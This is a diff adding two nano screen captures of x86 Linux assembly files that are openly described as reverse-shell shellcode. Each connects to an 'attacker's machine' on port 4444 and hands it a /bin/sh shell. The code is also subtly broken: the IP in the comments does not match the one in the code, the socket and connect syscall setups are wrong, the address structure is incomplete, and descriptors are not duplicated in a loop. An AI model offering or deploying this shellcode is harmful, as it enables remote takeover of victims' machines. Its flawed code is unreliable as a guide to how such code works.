@@ -1,0 +1,85 @@
+GNU nano 7.2                                                             sc.asm
+; This is a simplified example of reverse shell shellcode.
+; The shellcode connects to an attacker's machine at IP 192.168.1.100 on port 4444
+; and creates a shell (/bin/sh) on the victim's machine to allow remote control.
+
+section .text
+global _start
+
+_start:
+    ; Create a socket (socket call)
+    ; Socket: AF_INET (IPv4), SOCK_STREAM (TCP)
+    ; syscall number for socket is 102 on x86 Linux
+    mov eax, 102          ; syscall number for socket
+    xor ebx, ebx          ; AF_INET (IPv4)
+    mov ecx, 1            ; SOCK_STREAM (TCP)
+    xor edx, edx          ; protocol (0)
+    int 0x80              ; make syscall
+    mov ebx, eax          ; save socket descriptor
+
+    ; Connect to attacker machine (192.168.1.100:4444)
+    ; Set up sockaddr_in structure (IPv4, port 4444, IP 192.168.1.100)
+    push 0x0100007F       ; IP 127.0.0.1 (localhost, change to attacker's IP)
+    push word 0x5C11      ; Port 4444 in network byte order (0x5C11 = 4444)
+    mov ecx, esp          ; pointer to sockaddr_in struct
+
+    ; Connect syscall (syscall number 104)
+    mov eax, 104
+    int 0x80
+
+    ; Dup file descriptors to stdin, stdout, stderr
+    ; Duplicate socket to stdin, stdout, stderr (file descriptors 0, 1, 2)
+    xor edx, edx
+    mov al, 63            ; syscall number for dup2
+    int 0x80
+
+    ; Execute /bin/sh (system shell)
+    xor eax, eax          ; Clear eax
+    push eax              ; Null terminator for string
+    push 0x68732F2F       ; //sh (ASCII for /bin/sh)
+    push 0x6E69622F       ; /bin (ASCII for /bin/sh)
+    mov ebx, esp          ; Point to "/bin/sh"
+    mov al, 11            ; execve syscall number
+    int 0x80              ; Call kernel
+
+    ; Exit (just in case)
+    xor eax, eax
+    inc eax
+    int 0x80
+
+
+  GNU nano 7.2                                                             msc.asm
+section .text
+    global _start
+
+_start:
+    ; Create a socket (AF_INET = IPv4, SOCK_STREAM = TCP)
+    mov eax, 102           ; syscall number for socket
+    xor ebx, ebx           ; AF_INET (IPv4)
+    mov ecx, 1             ; SOCK_STREAM (TCP)
+    xor edx, edx           ; Protocol (0)
+    int 0x80               ; Call kernel to create socket
+    mov ebx, eax           ; Save socket descriptor
+
+    ; Set up the sockaddr_in structure (IP address and port)
+    push 0x0100007F        ; Attacker's IP address (127.0.0.1 for localhost)
+    push word 0x5C11       ; Port 4444 in network byte order (0x5C11 = 4444)
+    mov ecx, esp           ; Save pointer to sockaddr_in structure
+
+    ; Connect to the attacker's machine (reverse shell connection)
+    mov eax, 104           ; syscall number for connect
+    int 0x80               ; Call kernel to connect to the attacker's IP
+
+    ; Redirect stdin, stdout, and stderr to the socket
+    xor edx, edx           ; Clear registers
+    mov al, 63             ; syscall number for dup2
+    int 0x80               ; Duplicate socket to stdin (0), stdout (1), stderr (2)
+
+    ; Execute the shell (/bin/sh)
+    xor eax, eax           ; Clear eax
+    push eax               ; Null terminator for the string
+    push 0x68732F2F        ; //sh (ASCII for /bin/sh)
+    push 0x6E69622F        ; /bin (ASCII for /bin/sh)
+    mov ebx, esp           ; Pointer to "/bin/sh"
+    mov al, 11             ; execve syscall number
+    int 0x80               ; Call kernel to execute the shell
